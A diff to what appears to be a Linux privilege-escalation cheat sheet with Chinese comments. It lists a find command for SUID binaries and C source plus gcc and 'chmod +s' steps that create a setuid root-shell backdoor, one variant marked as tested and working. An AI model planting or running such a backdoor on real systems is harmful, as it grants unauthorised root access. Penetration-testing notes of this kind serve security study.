@@ -285,15 +285,27 @@ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 
 Create a SUID binary
 ```
-# 创建一个 SUID二进制程序
+# 创建一个 SUID二进制程序的过程
 
-# 有些系统没有print命令 需要自己输入
-print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c
+# 1. 写c源代码文件 suid.c
 
-# 编译
-gcc -o /tmp/suid /tmp/suid.cs
+# 程序(1)亲测提权失败
+int main(void){
+setresuid(0, 0, 0);
+system("/bin/sh");
 
-# chmod
+# 程序(2)亲测提权成功
+int main()
+{
+    setgid(0);
+    setuid(0);
+    system("/bin/sh");
+}
+
+# 2. 编译出二进制程序 suid
+gcc -o /tmp/suid /tmp/suid.c
+
+# 3. root权限下使用chmod 增加setuid bit
 sudo chmod +x /tmp/suid # + 执行权限(execute right)
 sudo chmod +s /tmp/suid # + setuid bit
 ```
